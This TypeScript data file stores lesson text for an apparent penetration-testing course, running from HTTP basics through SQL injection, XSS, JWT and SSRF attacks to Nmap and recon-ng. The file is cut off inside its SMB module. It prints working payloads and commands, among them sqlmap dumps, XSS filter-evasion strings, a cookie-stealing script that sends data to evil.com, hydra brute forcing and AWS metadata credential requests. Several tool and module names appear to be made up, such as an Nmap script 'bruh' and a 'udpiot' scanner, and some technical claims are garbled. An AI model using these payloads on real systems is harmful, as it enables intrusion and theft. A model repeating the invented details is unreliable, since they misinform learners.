// Course data — all lesson content is stored as plain strings (no template literals)
// to avoid backtick escaping issues in TypeScript.

const mod1 = {
  title: 'Module 1: HTTP Fundamentals',
  lessons: [
    {
      key: 'mod1_0',
      title: 'How Browsers Talk to Servers',
      content:
        "Every web interaction starts with HTTP - the protocol that browsers and servers use to communicate.\n\n" +
        "What's happening when you type a URL:\n" +
        "1. Browser resolves the domain via DNS and gets an IP\n" +
        "2. Opens a TCP connection to that IP on port 80 or 443\n" +
        "3. Sends an HTTP request\n\n" +
        "HTTP Request anatomy:\n" +
        "GET /index.html HTTP/1.1\n" +
        "Host: example.com\n" +
        "User-Agent: Mozilla/5.0\n" +
        "Accept: text/html\n" +
        "Cookie: session_id=abc123\n\n" +
        "HTTP Response anatomy:\n" +
        "HTTP/1.1 200 OK\n" +
        "Content-Type: text/html\n" +
        "Content-Length: 1245\n" +
        "Set-Cookie: session=xyz\n\n" +
        "<html>...</html>\n\n" +
        "Methods you need to know:\n" +
        "- GET - retrieves data (query params in URL)\n" +
        "- POST - sends data (form submissions, APIs)\n" +
        "- PUT/DELETE - used in REST APIs\n" +
        "- PATCH - partial update\n\n" +
        "Status codes to memorize:\n" +
        "- 200 OK - request succeeded\n" +
        "- 301/302 - redirect\n" +
        "- 400 Bad Request - client error\n" +
        "- 401 Unauthorized - not authenticated\n" +
        "- 403 Forbidden - authenticated but not authorized\n" +
        "- 404 Not Found - resource does not exist\n" +
        "- 500 Internal Server Error - server broke\n\n" +
        "Tip: Use the Network tab in browser DevTools to see every request your browser makes. Right-click and copy as cURL to replay requests in your terminal.",
    },
    {
      key: 'mod1_1',
      title: 'Headers, Cookies & Sessions',
      content:
        "HTTP is stateless - servers do not remember who you are between requests. Cookies solve this.\n\n" +
        "How cookies work:\n" +
        "Server response:\n" +
        "Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict\n" +
        "Browser stores this. Every subsequent request:\n" +
        "Cookie: session_id=abc123\n\n" +
        "Cookie attributes:\n" +
        "- HttpOnly - JS cannot read it (prevents XSS theft)\n" +
        "- Secure - only sent over HTTPS\n" +
        "- SameSite - prevents CSRF (Strict blocks all cross-origin, Lax allows top-level nav)\n" +
        "- Max-Age/Expires - how long the cookie lives\n\n" +
        "Common attack vectors:\n" +
        "- Cookie theft via XSS leading to session hijacking\n" +
        "- Cookie prediction (weak RNG) leading to impersonation\n" +
        "- Missing Secure flag - cookie intercepted over HTTP\n" +
        "- Missing HttpOnly - JS-accessible and vulnerable to XSS theft\n\n" +
        "Testing cookies:\n" +
        "- View cookies in browser DevTools (Application tab, Cookies section)\n" +
        "- Replay with curl: curl -b \"session_id=abc123\" https://target.com/dashboard\n" +
        "- Edit cookie value and refresh to test authorization\n\n" +
        "Session tokens are usually:\n" +
        "- Random UUIDs (hard to guess)\n" +
        "- JWTs (base64-encoded JSON with signature)\n" +
        "- Legacy apps sometimes use predictable values (timestamps, user IDs)\n\n" +
        "Always test what happens when you modify or clear your session cookie.",
    },
    {
      key: 'mod1_2',
      title: 'Burp Suite Setup',
      content:
        "Burp Suite is the industry-standard tool for web testing. Here is how to set it up properly.\n\n" +
        "Installation:\n" +
        "Download from PortSwigger (Community edition is free)\n" +
        "Requires Java 11+\n" +
        "Run: java -jar burpsuite_community.jar\n\n" +
        "Proxy setup (browser):\n" +
        "1. Go to browser settings, Proxy, Manual\n" +
        "2. Set HTTP Proxy to 127.0.0.1:8080\n" +
        "3. Install Burp's CA cert (visit http://burpsuite/cert, download, import into browser)\n\n" +
        "Key Burp tabs:\n" +
        "- Proxy > Intercept - pause requests and responses to inspect or modify\n" +
        "- Proxy > HTTP History - all traffic you have proxied\n" +
        "- Target > Site map - discovered URLs and parameters\n" +
        "- Repeater - manually modify and resend requests\n" +
        "- Intruder - automate parameter fuzzing\n" +
        "- Decoder - encode and decode data (URL, Base64, etc.)\n\n" +
        "Scoped filtering:\n" +
        "Always set your target scope before testing:\n" +
        "- Target > Scope > Add host and protocol\n" +
        "- Proxy > Options > Intercept is on toggle - enable Use suite scope\n\n" +
        "This prevents you from accidentally hitting unrelated sites.\n\n" +
        "Essential Burp shortcuts:\n" +
        "- Ctrl+R - send to Repeater\n" +
        "- Ctrl+I - send to Intruder\n" +
        "- Ctrl+U - URL encode selection\n" +
        "- Ctrl+Shift+U - URL decode selection\n\n" +
        "Tip: Use Scope filter in HTTP History to only see traffic to your target. Your history fills up fast on real engagements.",
    },
  ],
};

const mod2 = {
  title: 'Module 2: Information Disclosure',
  lessons: [
    {
      key: 'mod2_0',
      title: 'Robots.txt, Source Maps & Directory Busting',
      content:
        "Applications often accidentally expose things they should not. Finding these is often the first step in a pentest.\n\n" +
        "Robots.txt:\n" +
        "Search engines follow this file to know what to skip indexing. Pentesters read it to find what the developer did not want indexed.\n\n" +
        "User-agent: *\n" +
        "Disallow: /admin/\n" +
        "Disallow: /backup/\n" +
        "Disallow: /config/\n" +
        "Sitemap: /sitemap.xml\n\n" +
        "Always check:\n" +
        "- /robots.txt\n" +
        "- /sitemap.xml\n" +
        "- /.git/ (exposed git repo - contains full source code history)\n" +
        "- /.svn/\n" +
        "- /.env (credentials exposed)\n\n" +
        "Source maps (.map files):\n" +
        "Minified JS often has accompanying source maps for debugging. If exposed:\n" +
        "/static/js/app.js.map - reveals full unbundled source code\n\n" +
        "Directory enumeration:\n" +
        "Common tools: gobuster, ffuf, dirsearch\n" +
        "High-value paths to look for:\n" +
        "/admin /login /dashboard /api /backup /db /config /.git\n" +
        "/test /debug /dev /dist /src /wp-admin /phpmyadmin\n\n" +
        "Tip: Pay attention to 401 and 403 responses. They mean the resource exists but you cannot access it. That is often more interesting than a 404.",
    },
    {
      key: 'mod2_1',
      title: 'Git Exposure (git-dumper)',
      content:
        "Exposed .git directories are one of the highest-value findings in web pentesting. They contain the entire history of every code change ever made.\n\n" +
        "What you will find:\n" +
        "- Full source code (sometimes with credentials hardcoded)\n" +
        "- Database credentials in config files\n" +
        "- AWS keys in CI/CD pipelines\n" +
        "- Internal documentation\n" +
        "- Old vulnerabilities that were fixed but still in history\n\n" +
        "Dumping a git repo:\n" +
        "Tool: git-dumper (pip install git-dumper)\n" +
        "git-dumper https://target.com/.git /tmp/target-repo\n\n" +
        "Or manually:\n" +
        "mkdir repo && cd repo && git init && git remote add origin https://target.com/.git && git fetch --all && git checkout origin/main\n\n" +
        "What to look for once you have the repo:\n" +
        "- Find credentials: grep -r \"password\" --no-index .\n" +
        "- Find API keys: grep -r \"api_key\" --no-index .\n" +
        "- Check .env file: cat .env\n" +
        "- Find database connection strings: grep -r \"mysql\\|postgres\\|mongodb\" --no-index .\n\n" +
        "Real example: Tesla left their GitHub .git exposed in 2017. Researchers found AWS keys that gave read/write access to Tesla's cloud infrastructure.\n\n" +
        "Defensive fix (nginx):\n" +
        "location ~ /\\.git { deny all; }",
    },
    {
      key: 'mod2_2',
      title: 'Finding Exposed APIs & Debug Endpoints',
      content:
        "Modern web apps expose APIs everywhere. Finding them is a matter of knowing where to look.\n\n" +
        "Common API patterns:\n" +
        "/api/v1/users /api/v2/posts /api/auth/login /api/debug/queries /api/health /swagger.json /openapi.json /api-docs\n\n" +
        "Swagger and OpenAPI docs:\n" +
        "If exposed, they give you the complete API schema - every endpoint, parameter, and expected response.\n" +
        "Common locations:\n" +
        "/swagger/index.html /api-docs /v1/api-docs /swagger-ui/ /api/swagger.json\n\n" +
        "Debug endpoints in production:\n" +
        "- /debug/pprof (Go apps)\n" +
        "- /actuator/health (Spring Boot)\n" +
        "- /debug vars (Node.js express in dev mode)\n" +
        "- /?debug=1\n\n" +
        "HTTP methods enumeration:\n" +
        "Tools like ffuf can test all HTTP methods:\n" +
        "ffuf -w methods.txt -u https://target.com/api -X FUZZ\n\n" +
        "Version fingerprinting:\n" +
        "API responses often leak version info in headers:\n" +
        "X-API-Version: 2.1.3\n" +
        "Server: Apache/2.4.41 (Ubuntu)\n\n" +
        "Always look at response headers - they often tell you more than the body.",
    },
  ],
};

const mod3 = {
  title: 'Module 3: SQL Injection',
  lessons: [
    {
      key: 'mod3_0',
      title: 'In-Band SQLi: Finding & Exploiting',
      content:
        "SQL injection is still one of the most critical web vulnerabilities. It lets you read, write, and sometimes execute commands on the database server.\n\n" +
        "How it works:\n" +
        "User input is not sanitized before being embedded in a SQL query:\n" +
        "query = f\"SELECT * FROM users WHERE name = '{name}'\"\n" +
        "User enters: ' OR '1'='1\n" +
        "Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1'\n\n" +
        "Finding SQLi - classic tests:\n" +
        "' - triggers SQL error\n" +
        "\" - might trigger error or behave differently\n" +
        "' OR '1'='1 - bypasses auth or returns extra rows\n" +
        "' AND '1'='2 - should return nothing\n" +
        "' UNION SELECT 1,2,3 -- - - test for UNION support\n\n" +
        "Error-based detection:\n" +
        "If the app reflects SQL errors to the page, you can extract data through error messages:\n" +
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) -- -\n" +
        "# MS-SQL error leaks table names\n\n" +
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -\n" +
        "# MySQL error leaks current DB name\n\n" +
        "The key insight: Every parameter is a candidate. Test all of them - query params, POST body, cookies, headers (X-Forwarded-For is commonly injectable).\n\n" +
        "Tools:\n" +
        "sqlmap automates injection:\n" +
        "sqlmap -u \"https://target.com/search?q=1\" --batch --dbs\n" +
        "sqlmap -u \"https://target.com/login\" --data \"user=admin&pass=*\" --dbs",
    },
    {
      key: 'mod3_1',
      title: 'Blind SQLi: Time-Based & Boolean',
      content:
        "Blind SQLi is when the app does not show you error messages or query results, but you can still extract data by asking true or false questions.\n\n" +
        "Boolean-based blind:\n" +
        "# Normal: page loads in 200ms\n" +
        "# Inject true condition: ' AND 1=1 -- - - page loads normally (200ms)\n" +
        "# Inject false condition: ' AND 1=2 -- - - different response or blank page\n\n" +
        "To extract admin password hash character by character:\n" +
        "' AND SUBSTRING((SELECT password FROM users WHERE role='admin' LIMIT 1),1,1)='a' -- -\n" +
        "If true - normal response. If false - different response.\n\n" +
        "Time-based blind (use when there is no visible difference):\n" +
        "MySQL: ' AND IF(1=1, SLEEP(3), 0) -- -\n" +
        "MS-SQL: '; WAITFOR DELAY '00:00:03'-- -\n" +
        "PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 0 END-- -\n\n" +
        "Automating blind SQLi with sqlmap:\n" +
        "sqlmap -u \"https://target.com/product?id=1\" --batch \\\n" +
        "  --level=5 --risk=3 --time-sec=3 --dbms=mysql --passwords\n\n" +
        "Practical timing: Time-based blind is slow. A 10-character password takes roughly 5 minutes to guess at 1 char per minute. Use boolean-based if possible - it is faster.\n\n" +
        "Tip: Always test for blind injection with both ' AND 1=1 and ' AND 1=2 side by side. If they produce different responses, you have injection.",
    },
    {
      key: 'mod3_2',
      title: 'SQLMap Automation',
      content:
        "sqlmap automates the entire SQL injection process - from detection to data extraction to shell access.\n\n" +
        "Basic usage:\n" +
        "# Detect injection:\n" +
        "sqlmap -u \"https://target.com/search?q=test\"\n\n" +
        "# Get databases:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" --dbs\n\n" +
        "# Get tables from a database:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" -D target_db --tables\n\n" +
        "# Dump everything:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" -D target_db -T users --dump\n\n" +
        "POST-based injection:\n" +
        "sqlmap -u \"https://target.com/login\" \\\n" +
        "  --data=\"username=admin&password=test\" --batch --dbs\n\n" +
        "Cookies (authenticated testing):\n" +
        "sqlmap -u \"https://target.com/profile?id=1\" \\\n" +
        "  --cookie=\"session_id=abc123\" --level=2 --dbs\n\n" +
        "Advanced options:\n" +
        "# Specify injection point (when auto-detect fails):\n" +
        "sqlmap -u \"https://target.com\" \\\n" +
        "  --data=\"id=1&price=500\" -p price\n\n" +
        "# Use proxy to see traffic:\n" +
        "sqlmap --proxy=http://127.0.0.1:8080\n\n" +
        "# Custom headers:\n" +
        "sqlmap -u \"https://target.com\" \\\n" +
        "  --header=\"User-Agent: Mozilla/5.0\"\n\n" +
        "WARNING: Always use --batch in automated scans. sqlmap will ask for confirmation before doing dangerous things like --os-shell.",
    },
  ],
};

const mod4 = {
  title: 'Module 4: Cross-Site Scripting (XSS)',
  lessons: [
    {
      key: 'mod4_0',
      title: 'Reflected, Stored & DOM XSS',
      content:
        "XSS lets you run arbitrary JavaScript in other users' browsers. Three main types:\n\n" +
        "Reflected XSS:\n" +
        "The malicious script is in the request and reflected in the response without sanitization.\n" +
        "https://target.com/search?q=<script>alert(1)</script>\n" +
        "Page shows: Results for <script>alert(1)</script>\n" +
        "Requires the victim to click a crafted link.\n\n" +
        "Stored (Persistent) XSS:\n" +
        "The payload is saved on the server and served to every user who views the page.\n" +
        "Post a comment with:\n" +
        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n" +
        "Every admin who views the comment page has their cookie stolen.\n" +
        "Highest impact - no user interaction needed beyond visiting the page.\n\n" +
        "DOM XSS:\n" +
        "The page is vulnerable because client-side JavaScript processes user input and writes it to the DOM without sanitization.\n" +
        "const params = new URLSearchParams(window.location.search);\n" +
        "document.getElementById('output').innerHTML = params.get('name');\n" +
        "Attacker visits: ?name=<img src=x onerror=alert(1)>\n\n" +
        "Finding XSS manually:\n" +
        "Test payload: <script>alert(1)</script>\n" +
        "Test everywhere: URL parameters, form inputs, HTTP headers (User-Agent and Referer are often reflected), cookie values\n\n" +
        "Bug bounty tip: Most programs categorize XSS differently. DOM XSS often has its own report type since it is purely client-side.",
    },
    {
      key: 'mod4_1',
      title: 'Filter Evasion Techniques',
      content:
        "Applications often have XSS filters that block basic payloads. Bypass them by understanding what they are checking.\n\n" +
        "Case insensitive filters (blocks 'script' but not 'SCRIPT'):\n" +
        "<img src=x onerror=alert(1)> - lowercase works\n" +
        "<ScRiPt>alert(1)</ScRiPt> - mixed case bypasses\n\n" +
        "Blacklist filters that miss event handlers:\n" +
        "Blocks <script> tags but not:\n" +
        "<img src=x onerror=alert(1)>\n" +
        "<svg onload=alert(1)>\n" +
        "<body onload=alert(1)>\n" +
        "<video><source onerror=alert(1)>\n" +
        "<marquee onstart=alert(1)>\n\n" +
        "Blocked 'onerror' - try other events:\n" +
        "onload onerror onmouseover onfocus onblur\n" +
        "onkeydown onkeyup onkeypress\n" +
        "oninput onchange ontoggle\n\n" +
        "HTML entity encoding bypass:\n" +
        "If the app HTML-encodes < and > but you control attribute values:\n" +
        "<a href=\"javascript:alert(1)\">click</a>\n\n" +
        "Polyglot payloads (work in multiple contexts):\n" +
        "jaVasCript:/*-/*`/*:`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    },
  ],
};

const mod5 = {
  title: 'Module 5: Authentication Flaws',
  lessons: [
    {
      key: 'mod5_0',
      title: 'Brute Force & Credential Stuffing',
      content:
        "Authentication is a common attack surface. Here is how to test it.\n\n" +
        "Brute force attacks:\n" +
        "hydra -l admin -P passwords.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid password\"\n\n" +
        "Burp Intruder:\n" +
        "1. Proxy a login request > Send to Intruder\n" +
        "2. Positions tab > mark the password parameter as payload position\n" +
        "3. Payloads tab > load wordlist\n" +
        "4. Start attack\n\n" +
        "What to test:\n" +
        "- Username enumeration (does 'admin' vs 'fakeuser' give different responses?)\n" +
        "- Password policies (minimum length? complexity requirements?)\n" +
        "- Account lockout (5 failed logins > locked for 30 min?)\n" +
        "- MFA bypass (can you access without MFA by skipping the step?)\n\n" +
        "Credential stuffing:\n" +
        "Using leaked credentials from other breaches on this target.\n" +
        "Check haveibeenpwned for email breaches:\n" +
        "curl \"https://haveibeenpwned.com/api/v3/breachedaccount/user@email.com\"\n\n" +
        "Rate limiting tests:\n" +
        "for i in {1..20}; do curl -X POST https://target.com/login -d \"user=admin&pass=test\"; echo \"Attempt $i\"; done\n\n" +
        "If there is no rate limiting and no lockout policy, login brute force is trivial.",
    },
    {
      key: 'mod5_1',
      title: 'JWT Manipulation',
      content:
        "JSON Web Tokens (JWT) are commonly used for authentication. They are often vulnerable to tampering.\n\n" +
        "JWT structure:\n" +
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n" +
        "Header.Payload.Signature\n\n" +
        "Decode: echo \"eyJ...\" | base64 -d\n\n" +
        "Common JWT vulnerabilities:\n\n" +
        "1. None algorithm (alg: 'none'):\n" +
        "Change header to: {\"alg\":\"none\",\"typ\":\"JWT\"}\n" +
        "Remove signature part (leave trailing dot)\n" +
        "Now it is a signed token with no verification.\n\n" +
        "2. Algorithm confusion (RS256 to HS256):\n" +
        "If the server expects RS256 (asymmetric) but you change the alg to HS256 and sign with the public key:\n" +
        "The public key used for RS256 verification can be used as an HS256 secret.\n\n" +
        "3. Weak secrets:\n" +
        "Crack the HMAC secret: john --wordlist=rockyou.txt jwt_hashes.txt\n" +
        "hashcat -m 16500 jwt.txt wordlist.txt\n\n" +
        "Always test: Change the sub (subject) claim to another user ID. If the server trusts the token without re-verifying the identity, you can impersonate anyone.",
    },
  ],
};

const mod6 = {
  title: 'Module 6: SSRF & IDOR',
  lessons: [
    {
      key: 'mod6_0',
      title: 'Server-Side Request Forgery',
      content:
        "SSRF lets you make the server perform requests on your behalf - often to internal services that are not accessible from the internet.\n\n" +
        "Classic SSRF pattern:\n" +
        "GET /api/fetch?url=https://example.com\n" +
        "Attacker changes url to internal services:\n" +
        "?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)\n" +
        "?url=http://localhost:6379/                   (Redis)\n" +
        "?url=http://internal-db:5432/                (PostgreSQL)\n\n" +
        "AWS metadata exploitation:\n" +
        "If running on AWS, the metadata service is at:\n" +
        "http://169.254.169.254/latest/meta-data/\n" +
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n" +
        "This returns AWS keys if the instance has an IAM role.\n\n" +
        "Blind SSRF:\n" +
        "Sometimes you cannot see the response but you can detect impact through timing or side effects:\n" +
        "?url=http://internal:22 - if open, fast response. If filtered, timeout.\n\n" +
        "Bypassing SSRF filters:\n" +
        "- localhost variations: 127.0.0.1, localhost, 0x7f000001 (hex), [::1]\n" +
        "- DNS resolution tricks: Burp Collaborator payload, own domain resolving to internal IP\n" +
        "- URL parsing inconsistencies:\n" +
        "http://example.com@127.0.0.1\n" +
        "http://127.0.0.1%23@example.com (URL encode of # fragment)",
    },
    {
      key: 'mod6_1',
      title: 'IDOR: Insecure Direct Object References',
      content:
        "IDOR happens when the app uses user-supplied input to access objects directly, without checking if the current user has permission.\n\n" +
        "Example:\n" +
        "GET /api/users/12345 - returns your profile\n" +
        "GET /api/users/12346 - returns another user's profile - IDOR!\n\n" +
        "How to find IDOR:\n" +
        "1. Find endpoints that expose object IDs (user IDs, file IDs, order IDs, record IDs)\n" +
        "2. Map out which requests are authorized for your account\n" +
        "3. Try accessing other users' resources by changing IDs\n" +
        "4. Look for sequential IDs (12345, 12346, 12347 - easy to enumerate)\n\n" +
        "Tools:\n" +
        "Burp Intruder: capture request for /api/profile, set payload to enumerate user IDs 1-1000.\n" +
        "Look for 200 responses with other users' data.\n\n" +
        "Mass assignment IDOR:\n" +
        "Sometimes the app grants you access legitimately, but blindly trusts parameters you send:\n" +
        "PUT /api/users/12345 with {\"name\":\"John\",\"email\":\"john@example.com\"}\n" +
        "Try adding a privileged field:\n" +
        "PUT /api/users/12345 with {\"name\":\"John\",\"role\":\"admin\"}\n" +
        "Server accepts role: admin and promotes you!\n\n" +
        "Test every parameter: IDOR is not just in URLs - POST body, JSON, form data, and headers can all carry object references.",
    },
  ],
};

type Module = {
  title: string;
  lessons: { key: string; title: string; content: string }[];
};

type Course = {
  id: number;
  title: string;
  description: string;
  instructor: string;
  level: string;
  duration: string;
  lessons: number;
  image: string;
  modules: Module[];
};

// ── NEW MODULES for courses 5, 6, 7 ─────────────────────────────────────────

const mod17 = {
  title: 'Module 1: Reconnaissance & Port Scanning',
  lessons: [
    {
      key: 'mod17_1_0',
      title: 'Nmap Fundamentals',
      content:
        "Nmap is the foundation of network testing. Master it and you will find more targets than anyone else in the room.\n\n" +
        "Core scan types:\n" +
        "nmap -sn 10.10.10.0/24          # Ping sweep - no port scan, just host discovery\n" +
        "nmap -sS 10.10.10.1             # SYN scan - fast, stealthy, requires root\n" +
        "nmap -sT 10.10.10.1             # TCP connect - slower but works everywhere\n" +
        "nmap -sU 10.10.10.1             # UDP scan - slow but finds DNS, NTP, SNMP\n" +
        "nmap -sC 10.10.10.1             # Default scripts - runs basic enumeration\n" +
        "nmap -A 10.10.10.1              # Aggressive - OS detection, version, scripts, traceroute\n\n" +
        "Timing templates (-T0 to -T5):\n" +
        "-T0/1: Paranoid/Sneaky — for IDS evasion, very slow\n" +
        "-T2: Polite — default for scripts\n" +
        "-T3: Normal — default nmap behavior\n" +
        "-T4: Aggressive — good for internal networks\n" +
        "-T5: Insane — only on fast networks with low latency\n\n" +
        "Output formats:\n" +
        "nmap -oA results 10.10.10.0/24   # All formats (normal, XML, grepable)\n" +
        "nmap -oN normal.txt ...          # Normal output\n" +
        "nmap -oX xml.xml ...             # XML for scripts/parsers\n" +
        "nmap -oG grepable.txt ...        # Grepable for grep/awk\n\n" +
        "Useful options:\n" +
        "--top-ports 100    # Scan only the 100 most common ports\n" +
        "-p-               # All 65535 ports (slow)\n" +
        "-p 22,80,443      # Specific ports\n" +
        "--script=vuln     # Run all vulnerability scripts\n" +
        "--script=banner   # Grab banners from discovered services",
    },
    {
      key: 'mod17_1_1',
      title: 'Service Version Detection & OS Fingerprinting',
      content:
        "Knowing what version of a service is running is the difference between a 5-minute shell and a week of wasted effort.\n\n" +
        "Version detection:\n" +
        "nmap -sV 10.10.10.1\n" +
        "# Output:\n" +
        "# PORT     STATE  SERVICE  VERSION\n" +
        "# 22/tcp   open   ssh      OpenSSH 7.4 (protocol 2.0)\n" +
        "# 80/tcp   open   http     Apache httpd 2.4.6\n" +
        "# 445/tcp  open   microsoft-ds  Windows Server 2012 R2\n\n" +
        "Version intensity (0-9):\n" +
        "nmap -sV --version-intensity 9  # Most thorough, slower\n" +
        "nmap -sV --version-intensity 2  # Quick banner grab\n\n" +
        "OS detection:\n" +
        "nmap -O 10.10.10.1\n" +
        "# Tries TCP/IP stack fingerprinting\n" +
        "# Works best when ports are open (filtered ports reduce accuracy)\n\n" +
        "Combined best practice scan:\n" +
        "nmap -sS -sV -O -p- --script=banner -oA full_scan 10.10.10.1\n\n" +
        "Banner grabbing manually:\n" +
        "nc -nv 10.10.10.1 80\n" +
        "HEAD / HTTP/1.0\\r\\n\\r\\n\n\n" +
        "# or\n" +
        "echo 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc 10.10.10.1 80\n\n" +
        "What to look for in banners:\n" +
        "- Exact software name and version\n" +
        "- Default error pages revealing server type\n" +
        "- SSH server key exchange algorithms (hints at OS)\n\n" +
        "Watch for version disclosure in headers:\n" +
        "curl -I http://10.10.10.1\n" +
        "# Server: Apache/2.4.41 (Ubuntu)\n" +
        "# X-Powered-By: PHP/7.4.3",
    },
    {
      key: 'mod17_1_2',
      title: 'NSE Scripts In Depth',
      content:
        "The Nmap Scripting Engine (NSE) has hundreds of scripts that automate everything from basic enumeration to critical vulnerability detection.\n\n" +
        "Script categories:\n" +
        "auth       # Brute force, bypass authentication\n" +
        "broadcast  # Discover hosts via broadcast protocols\n" +
        "brute      # Credential cracking for various services\n" +
        "default    # Default scripts (-sC)\n" +
        "discovery  # Active directory, shared files, etc.\n" +
        "dos        # DoS vulnerability tests\n" +
        "exploit    # Active exploits\n" +
        "external   # Checks against external databases\n" +
        "fuzzer     # Fuzzing routines\n" +
        "intrusive  # Potentially loud/impactful scans\n" +
        "malware    # Malware detection\n" +
        "safe       # Non-intrusive scans\n" +
        "version    # Version detection scripts\n" +
        "vuln       # Vulnerability detection\n\n" +
        "Useful scripts by category:\n\n" +
        "VULNERABILITY:\n" +
        "nmap --script=vuln -sV 10.10.10.1\n" +
        "nmap --script=smb-vuln* 10.10.10.1   # All SMB vulnerabilities\n" +
        "nmap --script=ssl-heartbleed 10.10.10.1\n" +
        "nmap --script=http-sql-injection 10.10.10.1\n\n" +
        "ENUMERATION:\n" +
        "nmap --script=smb-enum* 10.10.10.1    # Users, shares, policies\n" +
        "nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=target.com <dns-server>\n" +
        "nmap --script=ldap-search 10.10.10.1\n" +
        "nmap --script=snmp-info 10.10.10.1\n\n" +
        "BRUTE FORCE:\n" +
        "nmap --script=bruh,ftp-brute,smb-brute 10.10.10.1\n\n" +
        "Script arguments:\n" +
        "nmap --script=http-enum --script-args 'http-enum.base=/path/' 10.10.10.1\n" +
        "nmap --script=smb-brute --script-args 'userdb=/tmp/users.txt,passdb=/tmp/passwords.txt' 10.10.10.1\n\n" +
        "Most impactful scripts for external pentests:\n" +
        "ssl-cert, ssl-enum-ciphers, http-headers, http-methods, smb-security-mode, snmp-info, dns-zone-transfer, ftp-anon",
    },
    {
      key: 'mod17_1_3',
      title: 'Masscan & Alternative Scanners',
      content:
        "When you need to scan large networks in minutes, nmap is too slow. Masscan fills that gap.\n\n" +
        "Masscan basics:\n" +
        "masscan -p1-65535 10.10.10.0/24 --rate=10000 -oJ scan.json\n" +
        "# --rate=10000 = 10,000 packets/second (tune to not saturate your pipe)\n" +
        "# -oJ = JSON output\n\n" +
        "Masscan vs nmap:\n" +
        "- Masscan: Uses its own TCP/IP stack, extremely fast, less accurate\n" +
        "- Nmap: Uses OS TCP/IP stack, slower but more reliable\n\n" +
        "Masscan syntax mirrors nmap:\n" +
        "masscan -p80,443,8080,8443 10.0.0.0/8 --rate=5000\n" +
        "masscan -p1-1000 192.168.1.0/24 --banners\n\n" +
        "UdpIOT: Fast UDP scanner\n" +
        "udpiot -s 10000 -p 1-1000 10.10.10.0/24\n\n" +
        "RustScan: Modern alternative withautomation\n" +
        "rustscan -t 1500 -r 1-10000 10.10.10.1 -- -sV\n" +
        "# Automatically pipes results to nmap for version scan\n\n" +
        "Recommended workflow for large networks:\n" +
        "1. masscan -p80,443,8080,8443 10.0.0.0/8 --rate=5000 -oJ masscan.json\n" +
        "2. Parse JSON, extract IPs with open ports\n" +
        "3. Run nmap -sV on each target with full port scan\n\n" +
        "Finding alive hosts without port scanning:\n" +
        "masscan --ping 10.10.10.0/24\n" +
        "# ARP scan on local network, ICMP echo on remote\n" +
        "for i in {1..254}; do (ping -c1 -W1 10.10.10.$i > /dev/null 2>&1 && echo \"10.10.10.$i UP\") & done\n" +
        "wait\n\n" +
        "Tip: For internal network pentests, never skip the ARP sweep. Many hosts block ICMP but respond to ARP.",
    },
    {
      key: 'mod17_1_4',
      title: 'Recon-ng & OSINT Frameworks',
      content:
        "Recon-ng is the framework for open-source intelligence gathering. Think of it as nmap but for information gathering.\n\n" +
        "Starting recon-ng:\n" +
        "recon-ng\n" +
        "keys add shodan_api_key YOUR_KEY   # Add API keys for richer data\n\n" +
        "Core commands:\n" +
        "workspaces list              # Show all workspaces\n" +
        "workspaces create pentest     # Create a new workspace\n" +
        "db insert domains            # Add a domain to track\n" +
        "marketplace search           # List all modules\n\n" +
        "Useful modules:\n\n" +
        "DISCOVERY:\n" +
        "use recon/domains-hosts/bing_api\n" +
        "run                             # Find subdomains via Bing\n\n" +
        "use recon/domains-hosts/google_site_web\n" +
        "set SOURCE example.com\n" +
        "run\n\n" +
        "NETBLOCKS:\n" +
        "use recon/netblocks-hosts/ripster\n" +
        "set SOURCE 10.10.10.0/24\n" +
        "run\n\n" +
        "PORTS:\n" +
        "use discovery/devshosts/nmap\n" +
        "set SOURCE 10.10.10.0/24\n" +
        "run\n\n" +
        "Key recon-ng workflows:\n\n" +
        "# 1. Add company domain, find subdomains\n" +
        "db insert domains target.com\n" +
        "use recon/domains-hosts/brute_hosts\n" +
        "run\n\n" +
        "# 2. Harvest contacts for phishing\n" +
        "use recon/domains-contacts/metacrawler\n" +
        "set SOURCE company.com\n" +
        "run\n\n" +
        "# 3. Find vulnerabilities\n" +
        "use recon/domains-vulnerabilities/xssed\n" +
        "run\n\n" +
        "Other OSINT tools:\n" +
        "- theHarvester: theHarvester -d target.com -b all\n" +
        "- SpiderFoot: spiderfoot -s 10.10.10.0/24\n" +
        "- Amass: amass enum -passive -d target.com",
    },
  ],
};

const mod18 = {
  title: 'Module 2: SMB & Windows Enumeration',
  lessons: [
    {
      key: 'mod18_2_0',
      title: 'SMB Protocol Deep Dive',
      content:
        "SMB (Server Message Block) is the backbone of Windows networking. It is almost always in scope on internal pentests.\n\n" +
        "SMB versions:\n" +
        "- SMBv1 (CIFS): Legacy, disabled by default on Win10+ but still found in LAN. Vulnerable to EternalBlue (MS17-010).\n" +
        "- SMBv2: Vista/Server 2008+. Much improved protocol.\n" +
        "- SMBv3: Windows 8/Server 2012+. Supports encryption, better performance.\n\n" +
        "Key ports:\n" +
        "139: SMB over NetBIOS (older, unauthenticated fallback)\n" +
        "445: Direct SMB over TCP (modern, the standard)\n" +
        "389: LDAP (used for SMB authentication context)\n" +
        "636: LDAPS (encrypted LDAP)\n\n" +
        "What you can do with SMB:\n" +
        "- Anonymous file shares (read/write if misconfigured)\n" +
        "- User enumeration (list users, groups, password policies)\n" +
